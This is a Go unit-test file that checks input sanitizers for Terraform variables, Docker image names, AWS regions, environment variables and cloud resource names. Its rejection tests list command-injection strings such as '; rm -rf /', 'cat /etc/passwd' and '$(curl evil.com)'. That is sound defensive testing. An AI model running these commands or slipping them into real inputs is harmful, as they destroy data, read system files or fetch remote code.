package validation

import (
	"strings"
	"testing"
)

// TestSanitizeTerraformVarValid tests that valid inputs are accepted
func TestSanitizeTerraformVarValid(t *testing.T) {
	validInputs := []string{
		"nginx:1.25",
		"us-east-1",
		"my-app-name",
		"registry.example.com/namespace/image:tag",
		"512",
		"1024",
		"t3.micro",
		"my_variable_name",
		"path/to/resource",
		"arn:aws:iam::123456789012:role/MyRole",
		"10.0.0.0/16",
		"example.com",
	}

	for _, input := range validInputs {
		t.Run(input, func(t *testing.T) {
			result, err := SanitizeTerraformVar(input)
			if err != nil {
				t.Errorf("Expected valid input %q to pass, got error: %v", input, err)
			}
			if result != input {
				t.Errorf("Expected result %q, got %q", input, result)
			}
		})
	}
}

// TestSanitizeTerraformVarRejectsInjection tests that injection attempts are rejected
func TestSanitizeTerraformVarRejectsInjection(t *testing.T) {
	maliciousInputs := []string{
		"; rm -rf /",
		"$(whoami)",
		"`whoami`",
		"test && echo hacked",
		"test || echo hacked",
		"test | cat /etc/passwd",
		"test > /tmp/hacked",
		"test < /etc/passwd",
		"test >> /tmp/log",
		"test << EOF",
		"${SECRET}",
		"test\nrm -rf /",
		"test\rmalicious",
		"test\tinjection",
		"test$(curl evil.com)",
		"test`curl evil.com`",
	}

	for _, input := range maliciousInputs {
		t.Run(input, func(t *testing.T) {
			_, err := SanitizeTerraformVar(input)
			if err == nil {
				t.Errorf("Expected malicious input %q to be rejected, but it passed", input)
			}
		})
	}
}

// TestSanitizeTerraformVarEmpty tests that empty input is rejected
func TestSanitizeTerraformVarEmpty(t *testing.T) {
	_, err := SanitizeTerraformVar("")
	if err == nil {
		t.Error("Expected empty input to be rejected")
	}
}

// TestSanitizeDockerImageValid tests valid Docker image names
func TestSanitizeDockerImageValid(t *testing.T) {
	validImages := []string{
		"nginx",
		"nginx:1.25",
		"nginx:latest",
		"ubuntu:22.04",
		"registry.example.com/nginx:1.25",
		"docker.io/library/nginx:latest",
		"gcr.io/project/image:tag",
		"my-registry.com:5000/my-image:v1.0.0",
		"image@sha256:abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890",
	}

	for _, image := range validImages {
		t.Run(image, func(t *testing.T) {
			result, err := SanitizeDockerImage(image)
			if err != nil {
				t.Errorf("Expected valid image %q to pass, got error: %v", image, err)
			}
			if result != image {
				t.Errorf("Expected result %q, got %q", image, result)
			}
		})
	}
}

// TestSanitizeDockerImageInvalid tests invalid Docker image names
func TestSanitizeDockerImageInvalid(t *testing.T) {
	invalidImages := []string{
		"",
		"nginx; rm -rf /",
		"nginx && echo hacked",
		"nginx | cat /etc/passwd",
		"nginx`whoami`",
		"nginx$(whoami)",
		"nginx\nmalicious",
		strings.Repeat("a", 256), // too long
	}

	for _, image := range invalidImages {
		t.Run(image, func(t *testing.T) {
			_, err := SanitizeDockerImage(image)
			if err == nil {
				t.Errorf("Expected invalid image %q to be rejected", image)
			}
		})
	}
}

// TestSanitizeAWSRegionValid tests valid AWS regions
func TestSanitizeAWSRegionValid(t *testing.T) {
	validRegions := []string{
		"us-east-1",
		"us-west-2",
		"eu-west-1",
		"ap-southeast-1",
		"sa-east-1",
	}

	for _, region := range validRegions {
		t.Run(region, func(t *testing.T) {
			result, err := SanitizeAWSRegion(region)
			if err != nil {
				t.Errorf("Expected valid region %q to pass, got error: %v", region, err)
			}
			if result != region {
				t.Errorf("Expected result %q, got %q", region, result)
			}
		})
	}
}

// TestSanitizeAWSRegionInvalid tests invalid AWS regions
func TestSanitizeAWSRegionInvalid(t *testing.T) {
	invalidRegions := []string{
		"",
		"invalid",
		"us-east-99",
		"fake-region-1",
		"us-east-1; rm -rf /",
		"us-east-1 && echo hacked",
	}

	for _, region := range invalidRegions {
		t.Run(region, func(t *testing.T) {
			_, err := SanitizeAWSRegion(region)
			if err == nil {
				t.Errorf("Expected invalid region %q to be rejected", region)
			}
		})
	}
}

// TestSanitizeDNSSafeNameValid tests valid DNS-safe names
func TestSanitizeDNSSafeNameValid(t *testing.T) {
	validNames := []string{
		"my-app",
		"test-deployment-123",
		"a1",
		"project-name-with-many-chars-but-still-valid-dns-name-here",
	}

	for _, name := range validNames {
		t.Run(name, func(t *testing.T) {
			result, err := SanitizeDNSSafeName(name)
			if err != nil {
				t.Errorf("Expected valid name %q to pass, got error: %v", name, err)
			}
			if result != name {
				t.Errorf("Expected result %q, got %q", name, result)
			}
		})
	}
}

// TestSanitizeDNSSafeNameInvalid tests invalid DNS-safe names
func TestSanitizeDNSSafeNameInvalid(t *testing.T) {
	invalidNames := []string{
		"",
		"a",                    // too short
		"A",                    // uppercase
		"My-App",               // uppercase
		"-my-app",              // starts with hyphen
		"my-app-",              // ends with hyphen
		"my_app",               // underscore not allowed
		"my.app",               // dot not allowed
		"my app",               // space not allowed
		"123-app",              // starts with number
		strings.Repeat("a", 64), // too long
	}

	for _, name := range invalidNames {
		t.Run(name, func(t *testing.T) {
			_, err := SanitizeDNSSafeName(name)
			if err == nil {
				t.Errorf("Expected invalid name %q to be rejected", name)
			}
		})
	}
}

// TestSanitizeEnvVarKeyValid tests valid environment variable keys
func TestSanitizeEnvVarKeyValid(t *testing.T) {
	validKeys := []string{
		"MY_VAR",
		"DATABASE_URL",
		"API_KEY",
		"_PRIVATE_VAR",
		"VAR123",
		"MY_LONG_VARIABLE_NAME_WITH_UNDERSCORES",
	}

	for _, key := range validKeys {
		t.Run(key, func(t *testing.T) {
			result, err := SanitizeEnvVarKey(key)
			if err != nil {
				t.Errorf("Expected valid key %q to pass, got error: %v", key, err)
			}
			if result != key {
				t.Errorf("Expected result %q, got %q", key, result)
			}
		})
	}
}

// TestSanitizeEnvVarKeyInvalid tests invalid environment variable keys
func TestSanitizeEnvVarKeyInvalid(t *testing.T) {
	invalidKeys := []string{
		"",
		"my-var",               // lowercase and hyphen
		"my.var",               // dot
		"123VAR",               // starts with number
		"MY VAR",               // space
		"MY-VAR",               // hyphen
		strings.Repeat("A", 129), // too long
	}

	for _, key := range invalidKeys {
		t.Run(key, func(t *testing.T) {
			_, err := SanitizeEnvVarKey(key)
			if err == nil {
				t.Errorf("Expected invalid key %q to be rejected", key)
			}
		})
	}
}

// TestSanitizeEnvVarValueValid tests valid environment variable values
func TestSanitizeEnvVarValueValid(t *testing.T) {
	validValues := []string{
		"simple value",
		"value with spaces",
		"value\nwith\nnewlines",
		"value\twith\ttabs",
		"special chars: !@#$%^&*()_+-=[]{}|;:',.<>?/~`",
		"unicode: 你好世界 🌍",
		"",
	}

	for _, value := range validValues {
		t.Run(value[:min(len(value), 20)], func(t *testing.T) {
			result, err := SanitizeEnvVarValue(value)
			if err != nil {
				t.Errorf("Expected valid value to pass, got error: %v", err)
			}
			if result != value {
				t.Errorf("Expected result %q, got %q", value, result)
			}
		})
	}
}

// TestSanitizeEnvVarValueInvalid tests invalid environment variable values
func TestSanitizeEnvVarValueInvalid(t *testing.T) {
	invalidValues := []string{
		"value\x00with null",
		"\x01control char",
		"value\x1Bwith escape",
	}

	for _, value := range invalidValues {
		t.Run("invalid_value", func(t *testing.T) {
			_, err := SanitizeEnvVarValue(value)
			if err == nil {
				t.Error("Expected invalid value to be rejected")
			}
		})
	}
}

// TestSanitizeConfigurationValid tests valid configuration maps
func TestSanitizeConfigurationValid(t *testing.T) {
	validConfig := map[string]string{
		"app_name":        "my-app",
		"region":          "us-east-1",
		"instance_type":   "t3.micro",
		"container_image": "nginx:1.25",
	}

	err := SanitizeConfiguration(validConfig)
	if err != nil {
		t.Errorf("Expected valid configuration to pass, got error: %v", err)
	}
}

// TestSanitizeConfigurationInvalid tests invalid configuration maps
func TestSanitizeConfigurationInvalid(t *testing.T) {
	testCases := []struct {
		name   string
		config map[string]string
	}{
		{
			name:   "nil config",
			config: nil,
		},
		{
			name: "invalid key",
			config: map[string]string{
				"app; rm -rf /": "value",
			},
		},
		{
			name: "invalid value",
			config: map[string]string{
				"app_name": "value; rm -rf /",
			},
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			err := SanitizeConfiguration(tc.config)
			if err == nil {
				t.Error("Expected invalid configuration to be rejected")
			}
		})
	}
}

// TestSanitizeS3BucketNameValid tests valid S3 bucket names
func TestSanitizeS3BucketNameValid(t *testing.T) {
	validNames := []string{
		"my-bucket",
		"my.bucket",
		"my-bucket-123",
		"bucket123",
		"a12",
	}

	for _, name := range validNames {
		t.Run(name, func(t *testing.T) {
			result, err := SanitizeS3BucketName(name)
			if err != nil {
				t.Errorf("Expected valid bucket name %q to pass, got error: %v", name, err)
			}
			if result != name {
				t.Errorf("Expected result %q, got %q", name, result)
			}
		})
	}
}

// TestSanitizeS3BucketNameInvalid tests invalid S3 bucket names
func TestSanitizeS3BucketNameInvalid(t *testing.T) {
	invalidNames := []string{
		"",
		"ab",                    // too short
		"My-Bucket",             // uppercase
		"-bucket",               // starts with hyphen
		"bucket-",               // ends with hyphen
		".bucket",               // starts with period
		"bucket.",               // ends with period
		"my..bucket",            // consecutive periods
		"xn--bucket",            // starts with xn--
		"bucket-s3alias",        // ends with -s3alias
		strings.Repeat("a", 64), // too long
	}

	for _, name := range invalidNames {
		t.Run(name, func(t *testing.T) {
			_, err := SanitizeS3BucketName(name)
			if err == nil {
				t.Errorf("Expected invalid bucket name %q to be rejected", name)
			}
		})
	}
}

// TestSanitizeDynamoDBTableNameValid tests valid DynamoDB table names
func TestSanitizeDynamoDBTableNameValid(t *testing.T) {
	validNames := []string{
		"MyTable",
		"my-table",
		"my_table",
		"my.table",
		"Table123",
		"abc",
	}

	for _, name := range validNames {
		t.Run(name, func(t *testing.T) {
			result, err := SanitizeDynamoDBTableName(name)
			if err != nil {
				t.Errorf("Expected valid table name %q to pass, got error: %v", name, err)
			}
			if result != name {
				t.Errorf("Expected result %q, got %q", name, result)
			}
		})
	}
}

// TestSanitizeDynamoDBTableNameInvalid tests invalid DynamoDB table names
func TestSanitizeDynamoDBTableNameInvalid(t *testing.T) {
	invalidNames := []string{
		"",
		"ab",                     // too short
		"my table",               // space
		"my/table",               // slash
		"my@table",               // special char
		strings.Repeat("a", 256), // too long
	}

	for _, name := range invalidNames {
		t.Run(name, func(t *testing.T) {
			_, err := SanitizeDynamoDBTableName(name)
			if err == nil {
				t.Errorf("Expected invalid table name %q to be rejected", name)
			}
		})
	}
}

// Helper function
func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
